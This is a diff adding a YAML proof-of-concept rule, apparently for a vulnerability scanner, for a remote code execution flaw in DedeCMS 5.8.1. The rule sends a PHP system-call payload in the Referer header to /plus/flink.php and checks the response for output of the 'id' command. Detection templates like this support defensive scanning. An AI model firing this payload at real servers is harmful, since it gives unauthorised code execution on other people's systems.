@@ -1,0 +1,18 @@
+name: poc-yaml-dedecms-v581-rce
+transport: http
+rules:
+  r1:
+    request:
+      method: GET
+      headers:
+        Referer: <?php "system"(id);?>
+      path: "/plus/flink.php?dopost=save"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"uid") && response.body.bcontains(b"gid") && response.body.bcontains(b"groups")
+expression:
+  r1()
+
+detail:
+  author: Henry4E36(https://github.com/Henry4E36/dedecms_5.8.1_RCE)ß
+  links:
+    - https://mp.weixin.qq.com/s/ln8nj53_5TfiyBJyaLLUZA
